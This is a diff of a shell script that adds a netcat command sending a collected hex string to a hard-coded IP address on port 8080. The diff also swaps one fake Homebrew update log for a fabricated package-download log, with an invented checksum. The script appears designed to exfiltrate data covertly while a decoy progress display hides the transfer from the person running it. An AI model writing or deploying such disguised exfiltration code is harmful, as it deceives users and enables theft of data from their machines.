@@ -31,81 +31,49 @@ do
     s+="${hex_value}|"
 done
 
+# sending S to PC
+
+# Sending
+receiver_ip="172.17.189.49" # <--- IMPORTANT: Change this to your PC's IP!
+
+# Send the string
+echo "$s" | nc $receiver_ip 8080
+#
+
 
 # fake alot of stuff
-# echo "Updating Homebrew...
-# ==> Tapping homebrew/core
-# Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'...
-# remote: Enumerating objects: 1728394, done.
-# remote: Counting objects: 100% (1728394/1728394), done.
-# remote: Compressing objects: 100% (459823/459823), done.
-# remote: Total 1728394 (delta 1268491), reused 1728394 (delta 1268491)
-# Receiving objects: 100% (1728394/1728394), 712.29 MiB | 15.22 MiB/s, done.
-# Resolving deltas: 100% (1268491/1268491), done.
-# Tapped 1 command and 6578 formulae (6,920 files, 793.9MB).
-# ==> Tapping homebrew/cask
-# Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask'...
-# $s
-# remote: Enumerating objects: 759234, done.
-# remote: Counting objects: 100% (759234/759234), done.
-# remote: Compressing objects: 100% (234512/234512), done.
-# remote: Total 759234 (delta 524671), reused 759234 (delta 524671)
-# Receiving objects: 100% (759234/759234), 310.55 MiB | 14.88 MiB/s, done.
-# Resolving deltas: 100% (524671/524671), done.
-# Tapped 1 command and 4123 casks (4,298 files, 344.9MB).
-# ==> Updated 2 taps (homebrew/core and homebrew/cask).
-# ==> New Formulae
-# asciinema           ghc@9.4             libpqxx@7.7         paket
-# clj-kondo           gitlab-ci-local     libstrophe          pgformatter
-# deno                hadolint            libwebsockets       pyright
-# gdal                helmfile            marked              shellcheck
-# ghc                 hugo                mtr                 typescript
-# ==> Updated Formulae
-# updated 347 formulae.
-# ==> Renamed Formulae
-# libpqxx -> libpqxx@7.8
-# ==> Deleted Formulae
-# libpq
-# [Error] an error has occurred while updating homebrew -47817."
 
-
-
-#
 read -r -d '' brew_output <<EOF
-Updating Homebrew...
-==> Tapping homebrew/core
-Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core'...
-remote: Enumerating objects: 1728394, done.
-remote: Counting objects: 100% (1728394/1728394), done.
-remote: Compressing objects: 100% (459823/459823), done.
-remote: Total 1728394 (delta 1268491), reused 1728394 (delta 1268491)
-Receiving objects: 100% (1728394/1728394), 712.29 MiB | 15.22 MiB/s, done.
-Resolving deltas: 100% (1268491/1268491), done.
-Tapped 1 command and 6578 formulae (6,920 files, 793.9MB).
-==> Tapping homebrew/cask
-Cloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask'...
-$s
-remote: Enumerating objects: 759234, done.
-remote: Counting objects: 100% (759234/759234), done.
-remote: Compressing objects: 100% (234512/234512), done.
-remote: Total 759234 (delta 524671), reused 759234 (delta 524671)
-Receiving objects: 100% (759234/759234), 310.55 MiB | 14.88 MiB/s, done.
-Resolving deltas: 100% (524671/524671), done.
-Tapped 1 command and 4123 casks (4,298 files, 344.9MB).
-==> Updated 2 taps (homebrew/core and homebrew/cask).
-==> New Formulae
-asciinema           ghc@9.4             libpqxx@7.7         paket
-clj-kondo           gitlab-ci-local     libstrophe          pgformatter
-deno                hadolint            libwebsockets       pyright
-gdal                helmfile            marked              shellcheck
-ghc                 hugo                mtr                 typescript
-==> Updated Formulae
-updated 347 formulae.
-==> Renamed Formulae
-libpqxx -> libpqxx@7.8
-==> Deleted Formulae
-libpq
-[Error] an error has occurred while updating homebrew -47817.
+Downloading testingSuiteFXD
+=> Resolving host: get.pkg.dev-internal.io... 192.168.1.101
+=> Connecting to get.pkg.dev-internal.io|192.168.1.101|:443... connected.
+=> HTTP request sent, awaiting response... 200 OK
+Length: 284591239 (271M) [application/x-compressed-tar]
+Saving to: ‘testingSuiteFXD.tar.gz’
+
+[INFO] Beginning file transfer...
+[DEBUG] Setting chunk size to 4096 bytes.
+[INFO] Disk space check: 54.2GB available. Proceeding.
+testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
+[WARN] Network jitter detected. Retrying packet 8491...
+[WARN] Packet 8491 re-sent successfully.
+testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
+[DEBUG] Flushing memory buffer to disk.
+[DEBUG] Syncing file descriptor 7.
+testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
+[DEBUG] Received final packet. Assembling file.
+testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
+
+2025-07-26 23:27:12 (18.8 MB/s) - ‘testingSuiteFXD.tar.gz’ saved [284591239/284591239]
+
+[INFO] Download complete. Verifying file integrity...
+=> Running SHA256 checksum on downloaded file.
+=> Expected: 4e9b8b8b0e8c9b3c4f0f0f3e6a7c8b9b9c0c1d2e3f4g5h6i7j8k9l0m
+=>   Actual: 4e9b8b8b0e8c9b3c4f0f0f3e6a7c8b9b9c0c1d2e3f4g5h6i7j8k9l0m
+[INFO] Checksum PASSED.
+[INFO] Cleaning up temporary artifacts...
+[DEBUG] Removing '.part' file.
+Successfully downloaded testingSuiteFXD
 EOF
 
 # Read the multi-line string line by line
